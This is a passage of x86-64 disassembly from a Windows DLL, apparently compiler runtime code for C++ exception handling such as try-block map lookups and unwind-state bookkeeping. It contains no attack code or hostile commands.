   180002a11:	4c 03 4c 24 60       	add    0x60(%rsp),%r9
   180002a16:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   180002a1a:	44 8b 10             	mov    (%rax),%r10d
   180002a1d:	33 c0                	xor    %eax,%eax
   180002a1f:	45 85 c0             	test   %r8d,%r8d
   180002a22:	74 21                	je     0x180002a45
   180002a24:	0f 1f 40 00          	nopl   0x0(%rax)
   180002a28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180002a2f:	00 
   180002a30:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   180002a34:	49 63 4c 91 0c       	movslq 0xc(%r9,%rdx,4),%rcx
   180002a39:	49 3b ca             	cmp    %r10,%rcx
   180002a3c:	74 12                	je     0x180002a50
   180002a3e:	ff c0                	inc    %eax
   180002a40:	41 3b c0             	cmp    %r8d,%eax
   180002a43:	72 eb                	jb     0x180002a30
   180002a45:	41 3b c0             	cmp    %r8d,%eax
   180002a48:	72 06                	jb     0x180002a50
   180002a4a:	85 ff                	test   %edi,%edi
   180002a4c:	75 92                	jne    0x1800029e0
   180002a4e:	eb 15                	jmp    0x180002a65
   180002a50:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180002a54:	49 63 4c 81 10       	movslq 0x10(%r9,%rax,4),%rcx
   180002a59:	49 8b 07             	mov    (%r15),%rax
   180002a5c:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   180002a60:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   180002a65:	49 8b d6             	mov    %r14,%rdx
   180002a68:	48 8b ce             	mov    %rsi,%rcx
   180002a6b:	e8 70 06 00 00       	call   0x1800030e0
   180002a70:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   180002a73:	8b f8                	mov    %eax,%edi
   180002a75:	85 db                	test   %ebx,%ebx
   180002a77:	74 2e                	je     0x180002aa7
   180002a79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002a80:	e8 1b fb ff ff       	call   0x1800025a0
   180002a85:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   180002a89:	ff cb                	dec    %ebx
   180002a8b:	48 03 48 60          	add    0x60(%rax),%rcx
   180002a8f:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   180002a93:	44 8b 4c 91 04       	mov    0x4(%rcx,%rdx,4),%r9d
   180002a98:	41 3b f9             	cmp    %r9d,%edi
   180002a9b:	7e 06                	jle    0x180002aa3
   180002a9d:	3b 7c 91 08          	cmp    0x8(%rcx,%rdx,4),%edi
   180002aa1:	7e 0a                	jle    0x180002aad
   180002aa3:	85 db                	test   %ebx,%ebx
   180002aa5:	75 d9                	jne    0x180002a80
   180002aa7:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   180002aad:	4c 8b c6             	mov    %rsi,%r8
   180002ab0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180002ab5:	49 8b d6             	mov    %r14,%rdx
   180002ab8:	e8 e3 18 00 00       	call   0x1800043a0
   180002abd:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180002ac2:	48 83 c4 20          	add    $0x20,%rsp
   180002ac6:	41 5f                	pop    %r15
   180002ac8:	41 5e                	pop    %r14
   180002aca:	5f                   	pop    %rdi
   180002acb:	5e                   	pop    %rsi
   180002acc:	5d                   	pop    %rbp
   180002acd:	c3                   	ret
   180002ace:	cc                   	int3
   180002acf:	cc                   	int3
   180002ad0:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180002ad5:	56                   	push   %rsi
   180002ad6:	57                   	push   %rdi
   180002ad7:	41 54                	push   %r12
   180002ad9:	41 56                	push   %r14
   180002adb:	41 57                	push   %r15
   180002add:	48 83 ec 20          	sub    $0x20,%rsp
   180002ae1:	41 8b 78 0c          	mov    0xc(%r8),%edi
   180002ae5:	4c 8b e1             	mov    %rcx,%r12
   180002ae8:	49 8b c8             	mov    %r8,%rcx
   180002aeb:	4d 8b f1             	mov    %r9,%r14
   180002aee:	49 8b e8             	mov    %r8,%rbp
   180002af1:	4c 8b fa             	mov    %rdx,%r15
   180002af4:	e8 e7 05 00 00       	call   0x1800030e0
   180002af9:	4d 8b 14 24          	mov    (%r12),%r10
   180002afd:	8b f0                	mov    %eax,%esi
   180002aff:	4d 89 16             	mov    %r10,(%r14)
   180002b02:	85 ff                	test   %edi,%edi
   180002b04:	0f 84 a4 00 00 00    	je     0x180002bae
   180002b0a:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   180002b0f:	90                   	nop
   180002b10:	48 63 45 10          	movslq 0x10(%rbp),%rax
   180002b14:	ff cf                	dec    %edi
   180002b16:	48 8d 14 bf          	lea    (%rdi,%rdi,4),%rdx
   180002b1a:	48 8d 1c 90          	lea    (%rax,%rdx,4),%rbx
   180002b1e:	49 03 5f 08          	add    0x8(%r15),%rbx
   180002b22:	3b 73 04             	cmp    0x4(%rbx),%esi
   180002b25:	7e 53                	jle    0x180002b7a
   180002b27:	3b 73 08             	cmp    0x8(%rbx),%esi
   180002b2a:	7f 4e                	jg     0x180002b7a
   180002b2c:	49 8b 0f             	mov    (%r15),%rcx
   180002b2f:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002b34:	45 33 c0             	xor    %r8d,%r8d
   180002b37:	ff 15 83 c5 00 00    	call   *0xc583(%rip)        # 0x18000f0c0
   180002b3d:	4c 63 4b 10          	movslq 0x10(%rbx),%r9
   180002b41:	4c 03 4c 24 50       	add    0x50(%rsp),%r9
   180002b46:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   180002b4a:	44 8b 10             	mov    (%rax),%r10d
   180002b4d:	33 c0                	xor    %eax,%eax
   180002b4f:	45 85 c0             	test   %r8d,%r8d
   180002b52:	74 21                	je     0x180002b75
   180002b54:	0f 1f 40 00          	nopl   0x0(%rax)
   180002b58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180002b5f:	00 
   180002b60:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   180002b64:	49 63 4c 91 0c       	movslq 0xc(%r9,%rdx,4),%rcx
   180002b69:	49 3b ca             	cmp    %r10,%rcx
   180002b6c:	74 12                	je     0x180002b80
   180002b6e:	ff c0                	inc    %eax
   180002b70:	41 3b c0             	cmp    %r8d,%eax
   180002b73:	72 eb                	jb     0x180002b60
   180002b75:	41 3b c0             	cmp    %r8d,%eax
   180002b78:	72 06                	jb     0x180002b80
   180002b7a:	85 ff                	test   %edi,%edi
   180002b7c:	75 92                	jne    0x180002b10
   180002b7e:	eb 14                	jmp    0x180002b94
   180002b80:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180002b84:	49 63 4c 81 10       	movslq 0x10(%r9,%rax,4),%rcx
   180002b89:	49 8b 04 24          	mov    (%r12),%rax
   180002b8d:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   180002b91:	49 89 0e             	mov    %rcx,(%r14)
   180002b94:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180002b99:	49 8b c6             	mov    %r14,%rax
   180002b9c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   180002ba1:	48 83 c4 20          	add    $0x20,%rsp
   180002ba5:	41 5f                	pop    %r15
   180002ba7:	41 5e                	pop    %r14
   180002ba9:	41 5c                	pop    %r12
   180002bab:	5f                   	pop    %rdi
   180002bac:	5e                   	pop    %rsi
   180002bad:	c3                   	ret
   180002bae:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   180002bb3:	49 8b c6             	mov    %r14,%rax
   180002bb6:	48 83 c4 20          	add    $0x20,%rsp
   180002bba:	41 5f                	pop    %r15
   180002bbc:	41 5e                	pop    %r14
   180002bbe:	41 5c                	pop    %r12
   180002bc0:	5f                   	pop    %rdi
   180002bc1:	5e                   	pop    %rsi
   180002bc2:	c3                   	ret
   180002bc3:	cc                   	int3
   180002bc4:	cc                   	int3
   180002bc5:	cc                   	int3
   180002bc6:	cc                   	int3
   180002bc7:	cc                   	int3
   180002bc8:	cc                   	int3
   180002bc9:	cc                   	int3
   180002bca:	cc                   	int3
   180002bcb:	cc                   	int3
   180002bcc:	cc                   	int3
   180002bcd:	cc                   	int3
   180002bce:	cc                   	int3
   180002bcf:	cc                   	int3
   180002bd0:	40 53                	rex push %rbx
   180002bd2:	55                   	push   %rbp
   180002bd3:	56                   	push   %rsi
   180002bd4:	57                   	push   %rdi
   180002bd5:	41 54                	push   %r12
   180002bd7:	41 56                	push   %r14
   180002bd9:	48 83 ec 38          	sub    $0x38,%rsp
   180002bdd:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   180002be4:	00 
   180002be5:	4c 8b e2             	mov    %rdx,%r12
   180002be8:	4c 8b f1             	mov    %rcx,%r14
   180002beb:	49 8b d1             	mov    %r9,%rdx
   180002bee:	48 8b cb             	mov    %rbx,%rcx
   180002bf1:	49 8b f9             	mov    %r9,%rdi
   180002bf4:	41 8b f0             	mov    %r8d,%esi
   180002bf7:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   180002bfa:	e8 e1 04 00 00       	call   0x1800030e0
   180002bff:	44 8b d0             	mov    %eax,%r10d
   180002c02:	85 ed                	test   %ebp,%ebp
   180002c04:	0f 84 ed 00 00 00    	je     0x180002cf7
   180002c0a:	4c 8b 5f 08          	mov    0x8(%rdi),%r11
   180002c0e:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   180002c14:	48 63 5b 10          	movslq 0x10(%rbx),%rbx
   180002c18:	8b d5                	mov    %ebp,%edx
   180002c1a:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   180002c1f:	45 8b f9             	mov    %r9d,%r15d
   180002c22:	49 8d 3c 1b          	lea    (%r11,%rbx,1),%rdi
   180002c26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180002c2d:	00 00 00 
   180002c30:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   180002c34:	4b 8d 0c 80          	lea    (%r8,%r8,4),%rcx
   180002c38:	49 8d 04 8b          	lea    (%r11,%rcx,4),%rax
   180002c3c:	44 3b 54 18 04       	cmp    0x4(%rax,%rbx,1),%r10d
   180002c41:	7e 0b                	jle    0x180002c4e
   180002c43:	44 3b 54 8f 08       	cmp    0x8(%rdi,%rcx,4),%r10d
   180002c48:	0f 8e 93 00 00 00    	jle    0x180002ce1
   180002c4e:	41 8b d0             	mov    %r8d,%edx
   180002c51:	45 85 c0             	test   %r8d,%r8d
   180002c54:	75 da                	jne    0x180002c30
   180002c56:	45 33 d2             	xor    %r10d,%r10d
   180002c59:	45 8b c2             	mov    %r10d,%r8d
   180002c5c:	41 8b d2             	mov    %r10d,%edx
   180002c5f:	90                   	nop
   180002c60:	8b c2                	mov    %edx,%eax
   180002c62:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180002c66:	4d 85 c0             	test   %r8,%r8
   180002c69:	74 13                	je     0x180002c7e
   180002c6b:	41 8b 40 04          	mov    0x4(%r8),%eax
   180002c6f:	39 04 8f             	cmp    %eax,(%rdi,%rcx,4)
   180002c72:	7e 20                	jle    0x180002c94
   180002c74:	41 8b 40 08          	mov    0x8(%r8),%eax
   180002c78:	39 44 8f 04          	cmp    %eax,0x4(%rdi,%rcx,4)
   180002c7c:	7f 16                	jg     0x180002c94
   180002c7e:	3b 34 8f             	cmp    (%rdi,%rcx,4),%esi
   180002c81:	7c 11                	jl     0x180002c94
   180002c83:	3b 74 8f 04          	cmp    0x4(%rdi,%rcx,4),%esi
   180002c87:	7f 0b                	jg     0x180002c94
   180002c89:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   180002c8d:	44 8b fa             	mov    %edx,%r15d
   180002c90:	44 0f 44 ca          	cmove  %edx,%r9d
   180002c94:	ff c2                	inc    %edx
   180002c96:	3b d5                	cmp    %ebp,%edx
   180002c98:	72 c6                	jb     0x180002c60
   180002c9a:	41 8b c2             	mov    %r10d,%eax
   180002c9d:	4d 89 26             	mov    %r12,(%r14)
   180002ca0:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   180002ca4:	4d 89 66 10          	mov    %r12,0x10(%r14)
   180002ca8:	41 0f 45 c1          	cmovne %r9d,%eax
   180002cac:	41 89 46 08          	mov    %eax,0x8(%r14)
   180002cb0:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002cb4:	41 89 46 0c          	mov    %eax,0xc(%r14)
   180002cb8:	41 8d 47 01          	lea    0x1(%r15),%eax
   180002cbc:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   180002cc1:	44 0f 45 d0          	cmovne %eax,%r10d
   180002cc5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002cc9:	41 89 46 1c          	mov    %eax,0x1c(%r14)
   180002ccd:	49 8b c6             	mov    %r14,%rax
   180002cd0:	45 89 56 18          	mov    %r10d,0x18(%r14)
   180002cd4:	48 83 c4 38          	add    $0x38,%rsp
   180002cd8:	41 5e                	pop    %r14
   180002cda:	41 5c                	pop    %r12
   180002cdc:	5f                   	pop    %rdi
   180002cdd:	5e                   	pop    %rsi
   180002cde:	5d                   	pop    %rbp
   180002cdf:	5b                   	pop    %rbx
   180002ce0:	c3                   	ret
   180002ce1:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180002ce4:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180002ce8:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   180002cec:	4c 03 c3             	add    %rbx,%r8
   180002cef:	45 33 d2             	xor    %r10d,%r10d
   180002cf2:	e9 65 ff ff ff       	jmp    0x180002c5c
   180002cf7:	e8 74 2d 00 00       	call   0x180005a70
   180002cfc:	cc                   	int3
   180002cfd:	cc                   	int3
   180002cfe:	cc                   	int3
   180002cff:	cc                   	int3
   180002d00:	4c 8b dc             	mov    %rsp,%r11
   180002d03:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   180002d0a:	48 8b 05 ef 72 01 00 	mov    0x172ef(%rip),%rax        # 0x18001a000
   180002d11:	48 33 c4             	xor    %rsp,%rax
   180002d14:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   180002d1b:	00 
   180002d1c:	4c 8b 94 24 38 01 00 	mov    0x138(%rsp),%r10
   180002d23:	00 
   180002d24:	48 8d 05 d5 13 00 00 	lea    0x13d5(%rip),%rax        # 0x180004100
   180002d2b:	0f 28 05 ee d3 00 00 	movaps 0xd3ee(%rip),%xmm0        # 0x180010120
   180002d32:	0f 28 0d f7 d3 00 00 	movaps 0xd3f7(%rip),%xmm1        # 0x180010130
   180002d39:	48 8b 09             	mov    (%rcx),%rcx
   180002d3c:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   180002d41:	0f 28 05 f8 d3 00 00 	movaps 0xd3f8(%rip),%xmm0        # 0x180010140
   180002d48:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   180002d4d:	0f 28 05 0c d4 00 00 	movaps 0xd40c(%rip),%xmm0        # 0x180010160
   180002d54:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   180002d59:	0f 28 0d f0 d3 00 00 	movaps 0xd3f0(%rip),%xmm1        # 0x180010150
   180002d60:	0f 29 4c 24 60       	movaps %xmm1,0x60(%rsp)
   180002d65:	0f 28 0d 04 d4 00 00 	movaps 0xd404(%rip),%xmm1        # 0x180010170
   180002d6c:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   180002d71:	0f 28 05 08 d4 00 00 	movaps 0xd408(%rip),%xmm0        # 0x180010180
   180002d78:	41 0f 29 4b 98       	movaps %xmm1,-0x68(%r11)
   180002d7d:	0f 28 0d 0c d4 00 00 	movaps 0xd40c(%rip),%xmm1        # 0x180010190
   180002d84:	41 0f 29 43 a8       	movaps %xmm0,-0x58(%r11)
   180002d89:	0f 28 05 10 d4 00 00 	movaps 0xd410(%rip),%xmm0        # 0x1800101a0
   180002d90:	41 0f 29 4b b8       	movaps %xmm1,-0x48(%r11)
   180002d95:	f2 0f 10 0d 13 d4 00 	movsd  0xd413(%rip),%xmm1        # 0x1800101b0
   180002d9c:	00 
   180002d9d:	f2 41 0f 11 4b d8    	movsd  %xmm1,-0x28(%r11)
   180002da3:	41 0f 29 43 c8       	movaps %xmm0,-0x38(%r11)
   180002da8:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180002dad:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   180002db4:	00 
   180002db5:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180002dba:	48 63 84 24 20 01 00 	movslq 0x120(%rsp),%rax
   180002dc1:	00 
   180002dc2:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   180002dc7:	45 33 c9             	xor    %r9d,%r9d
   180002dca:	49 89 43 80          	mov    %rax,-0x80(%r11)
   180002dce:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
   180002dd5:	00 
   180002dd6:	49 89 43 90          	mov    %rax,-0x70(%r11)
   180002dda:	0f b6 84 24 40 01 00 	movzbl 0x140(%rsp),%eax
   180002de1:	00 
   180002de2:	49 89 43 a0          	mov    %rax,-0x60(%r11)
   180002de6:	49 8b 42 40          	mov    0x40(%r10),%rax
   180002dea:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180002def:	49 8b 42 28          	mov    0x28(%r10),%rax
   180002df3:	4d 89 43 88          	mov    %r8,-0x78(%r11)
   180002df7:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180002dfc:	49 89 53 98          	mov    %rdx,-0x68(%r11)
   180002e00:	49 8b 12             	mov    (%r10),%rdx
   180002e03:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002e08:	49 c7 43 a8 20 05 93 	movq   $0x19930520,-0x58(%r11)
   180002e0f:	19 
   180002e10:	ff 15 4a c2 00 00    	call   *0xc24a(%rip)        # 0x18000f060
   180002e16:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   180002e1d:	00 
   180002e1e:	48 33 cc             	xor    %rsp,%rcx
   180002e21:	e8 aa e4 ff ff       	call   0x1800012d0
   180002e26:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   180002e2d:	c3                   	ret
   180002e2e:	cc                   	int3
   180002e2f:	cc                   	int3
   180002e30:	40 53                	rex push %rbx
   180002e32:	48 83 ec 20          	sub    $0x20,%rsp
   180002e36:	48 8b d9             	mov    %rcx,%rbx
   180002e39:	48 89 11             	mov    %rdx,(%rcx)
   180002e3c:	e8 5f f7 ff ff       	call   0x1800025a0
   180002e41:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   180002e45:	73 0b                	jae    0x180002e52
   180002e47:	e8 54 f7 ff ff       	call   0x1800025a0
   180002e4c:	48 8b 48 58          	mov    0x58(%rax),%rcx
   180002e50:	eb 02                	jmp    0x180002e54
   180002e52:	33 c9                	xor    %ecx,%ecx
   180002e54:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180002e58:	e8 43 f7 ff ff       	call   0x1800025a0
   180002e5d:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180002e61:	48 8b c3             	mov    %rbx,%rax
   180002e64:	48 83 c4 20          	add    $0x20,%rsp
   180002e68:	5b                   	pop    %rbx
   180002e69:	c3                   	ret
   180002e6a:	cc                   	int3
   180002e6b:	cc                   	int3
   180002e6c:	cc                   	int3
   180002e6d:	cc                   	int3
   180002e6e:	cc                   	int3
   180002e6f:	cc                   	int3
   180002e70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002e75:	57                   	push   %rdi
   180002e76:	48 83 ec 20          	sub    $0x20,%rsp
   180002e7a:	48 8b f9             	mov    %rcx,%rdi
   180002e7d:	e8 1e f7 ff ff       	call   0x1800025a0
   180002e82:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   180002e86:	75 35                	jne    0x180002ebd
   180002e88:	e8 13 f7 ff ff       	call   0x1800025a0
   180002e8d:	48 8b 40 58          	mov    0x58(%rax),%rax
   180002e91:	48 85 c0             	test   %rax,%rax
   180002e94:	74 27                	je     0x180002ebd
   180002e96:	48 8b 58 08          	mov    0x8(%rax),%rbx
   180002e9a:	48 3b f8             	cmp    %rax,%rdi
   180002e9d:	74 0a                	je     0x180002ea9
   180002e9f:	48 8b c3             	mov    %rbx,%rax
   180002ea2:	48 85 db             	test   %rbx,%rbx
   180002ea5:	74 16                	je     0x180002ebd
   180002ea7:	eb ed                	jmp    0x180002e96
   180002ea9:	e8 f2 f6 ff ff       	call   0x1800025a0
   180002eae:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180002eb2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002eb7:	48 83 c4 20          	add    $0x20,%rsp
   180002ebb:	5f                   	pop    %rdi
   180002ebc:	c3                   	ret
   180002ebd:	e8 ae 2b 00 00       	call   0x180005a70
   180002ec2:	cc                   	int3
   180002ec3:	cc                   	int3
   180002ec4:	cc                   	int3
   180002ec5:	cc                   	int3
   180002ec6:	cc                   	int3
   180002ec7:	cc                   	int3
   180002ec8:	cc                   	int3
   180002ec9:	cc                   	int3
   180002eca:	cc                   	int3
   180002ecb:	cc                   	int3
   180002ecc:	cc                   	int3
   180002ecd:	cc                   	int3
   180002ece:	cc                   	int3
   180002ecf:	cc                   	int3
   180002ed0:	48 83 ec 28          	sub    $0x28,%rsp
   180002ed4:	e8 c7 f6 ff ff       	call   0x1800025a0
   180002ed9:	48 8b 40 60          	mov    0x60(%rax),%rax
   180002edd:	48 83 c4 28          	add    $0x28,%rsp
   180002ee1:	c3                   	ret
   180002ee2:	cc                   	int3
   180002ee3:	cc                   	int3
   180002ee4:	cc                   	int3
   180002ee5:	cc                   	int3
   180002ee6:	cc                   	int3
   180002ee7:	cc                   	int3
   180002ee8:	cc                   	int3
   180002ee9:	cc                   	int3
   180002eea:	cc                   	int3
   180002eeb:	cc                   	int3
   180002eec:	cc                   	int3
   180002eed:	cc                   	int3
   180002eee:	cc                   	int3
   180002eef:	cc                   	int3
   180002ef0:	48 83 ec 28          	sub    $0x28,%rsp
   180002ef4:	e8 a7 f6 ff ff       	call   0x1800025a0
   180002ef9:	48 8b 40 68          	mov    0x68(%rax),%rax
   180002efd:	48 83 c4 28          	add    $0x28,%rsp
   180002f01:	c3                   	ret
   180002f02:	cc                   	int3
   180002f03:	cc                   	int3
   180002f04:	cc                   	int3
   180002f05:	cc                   	int3
   180002f06:	cc                   	int3
   180002f07:	cc                   	int3
   180002f08:	cc                   	int3
   180002f09:	cc                   	int3
   180002f0a:	cc                   	int3
   180002f0b:	cc                   	int3
   180002f0c:	cc                   	int3
   180002f0d:	cc                   	int3
   180002f0e:	cc                   	int3
   180002f0f:	cc                   	int3
   180002f10:	40 53                	rex push %rbx
   180002f12:	48 83 ec 20          	sub    $0x20,%rsp
   180002f16:	48 8b d9             	mov    %rcx,%rbx
   180002f19:	e8 82 f6 ff ff       	call   0x1800025a0
   180002f1e:	48 89 58 60          	mov    %rbx,0x60(%rax)
   180002f22:	48 83 c4 20          	add    $0x20,%rsp
   180002f26:	5b                   	pop    %rbx
   180002f27:	c3                   	ret
   180002f28:	cc                   	int3
   180002f29:	cc                   	int3
   180002f2a:	cc                   	int3
   180002f2b:	cc                   	int3
   180002f2c:	cc                   	int3
   180002f2d:	cc                   	int3
   180002f2e:	cc                   	int3
   180002f2f:	cc                   	int3
   180002f30:	40 53                	rex push %rbx
   180002f32:	48 83 ec 20          	sub    $0x20,%rsp
   180002f36:	48 8b d9             	mov    %rcx,%rbx
   180002f39:	e8 62 f6 ff ff       	call   0x1800025a0
   180002f3e:	48 89 58 68          	mov    %rbx,0x68(%rax)
   180002f42:	48 83 c4 20          	add    $0x20,%rsp
   180002f46:	5b                   	pop    %rbx
   180002f47:	c3                   	ret
   180002f48:	cc                   	int3
   180002f49:	cc                   	int3
   180002f4a:	cc                   	int3
   180002f4b:	cc                   	int3
   180002f4c:	cc                   	int3
   180002f4d:	cc                   	int3
   180002f4e:	cc                   	int3
   180002f4f:	cc                   	int3
   180002f50:	40 53                	rex push %rbx
   180002f52:	55                   	push   %rbp
   180002f53:	56                   	push   %rsi
   180002f54:	57                   	push   %rdi
   180002f55:	48 83 ec 48          	sub    $0x48,%rsp
   180002f59:	49 8b 59 08          	mov    0x8(%r9),%rbx
   180002f5d:	49 8b f9             	mov    %r9,%rdi
   180002f60:	49 8b f0             	mov    %r8,%rsi
   180002f63:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   180002f68:	48 8b e9             	mov    %rcx,%rbp
   180002f6b:	e8 30 f6 ff ff       	call   0x1800025a0
   180002f70:	48 89 58 60          	mov    %rbx,0x60(%rax)
   180002f74:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   180002f78:	e8 23 f6 ff ff       	call   0x1800025a0
   180002f7d:	48 89 58 68          	mov    %rbx,0x68(%rax)
   180002f81:	e8 1a f6 ff ff       	call   0x1800025a0
   180002f86:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   180002f8a:	4c 8b cf             	mov    %rdi,%r9
   180002f8d:	c6 44 24 38 00       	movb   $0x0,0x38(%rsp)
   180002f92:	4c 8b c6             	mov    %rsi,%r8
   180002f95:	8b 0a                	mov    (%rdx),%ecx
   180002f97:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180002f9c:	48 03 48 60          	add    0x60(%rax),%rcx
   180002fa0:	33 c0                	xor    %eax,%eax
   180002fa2:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002fa7:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180002fab:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180002fb0:	48 8b cd             	mov    %rbp,%rcx
   180002fb3:	e8 18 10 00 00       	call   0x180003fd0
   180002fb8:	48 83 c4 48          	add    $0x48,%rsp
   180002fbc:	5f                   	pop    %rdi
   180002fbd:	5e                   	pop    %rsi
   180002fbe:	5d                   	pop    %rbp
   180002fbf:	5b                   	pop    %rbx
   180002fc0:	c3                   	ret
   180002fc1:	cc                   	int3
   180002fc2:	cc                   	int3
   180002fc3:	cc                   	int3
   180002fc4:	cc                   	int3
   180002fc5:	cc                   	int3
   180002fc6:	cc                   	int3
   180002fc7:	cc                   	int3
   180002fc8:	cc                   	int3
   180002fc9:	cc                   	int3
   180002fca:	cc                   	int3
   180002fcb:	cc                   	int3
   180002fcc:	cc                   	int3
   180002fcd:	cc                   	int3
   180002fce:	cc                   	int3
   180002fcf:	cc                   	int3
   180002fd0:	48 83 ec 28          	sub    $0x28,%rsp
   180002fd4:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   180002fd8:	4c 8b da             	mov    %rdx,%r11
   180002fdb:	48 8b 01             	mov    (%rcx),%rax
   180002fde:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   180002fe2:	83 f8 fe             	cmp    $0xfffffffe,%eax
   180002fe5:	75 50                	jne    0x180003037
   180002fe7:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   180002feb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002ff0:	49 63 58 18          	movslq 0x18(%r8),%rbx
   180002ff4:	4d 8d 14 19          	lea    (%r9,%rbx,1),%r10
   180002ff8:	4d 85 d2             	test   %r10,%r10
   180002ffb:	74 4e                	je     0x18000304b
   180002ffd:	45 8b 40 14          	mov    0x14(%r8),%r8d
   180003001:	45 85 c0             	test   %r8d,%r8d
   180003004:	74 36                	je     0x18000303c
   180003006:	4d 8b 1b             	mov    (%r11),%r11
   180003009:	33 d2                	xor    %edx,%edx
   18000300b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003010:	49 63 0c d2          	movslq (%r10,%rdx,8),%rcx
   180003014:	49 03 c9             	add    %r9,%rcx
   180003017:	4c 3b d9             	cmp    %rcx,%r11
   18000301a:	72 07                	jb     0x180003023
   18000301c:	ff c2                	inc    %edx
   18000301e:	41 3b d0             	cmp    %r8d,%edx
   180003021:	72 ed                	jb     0x180003010
   180003023:	85 d2                	test   %edx,%edx
   180003025:	74 15                	je     0x18000303c
   180003027:	8d 42 ff             	lea    -0x1(%rdx),%eax
   18000302a:	49 8d 04 c1          	lea    (%r9,%rax,8),%rax
   18000302e:	8b 44 18 04          	mov    0x4(%rax,%rbx,1),%eax
   180003032:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180003037:	48 83 c4 28          	add    $0x28,%rsp
   18000303b:	c3                   	ret
   18000303c:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180003041:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   180003046:	48 83 c4 28          	add    $0x28,%rsp
   18000304a:	c3                   	ret
   18000304b:	e8 20 2a 00 00       	call   0x180005a70
   180003050:	cc                   	int3
   180003051:	cc                   	int3
   180003052:	cc                   	int3
   180003053:	cc                   	int3
   180003054:	cc                   	int3
   180003055:	cc                   	int3
   180003056:	cc                   	int3
   180003057:	cc                   	int3
   180003058:	cc                   	int3
   180003059:	cc                   	int3
   18000305a:	cc                   	int3
   18000305b:	cc                   	int3
   18000305c:	cc                   	int3
   18000305d:	cc                   	int3
   18000305e:	cc                   	int3
   18000305f:	cc                   	int3
   180003060:	40 53                	rex push %rbx
   180003062:	48 83 ec 20          	sub    $0x20,%rsp
   180003066:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   18000306b:	49 8b d8             	mov    %r8,%rbx
   18000306e:	e8 5d fa ff ff       	call   0x180002ad0
   180003073:	48 8b 08             	mov    (%rax),%rcx
   180003076:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   18000307a:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
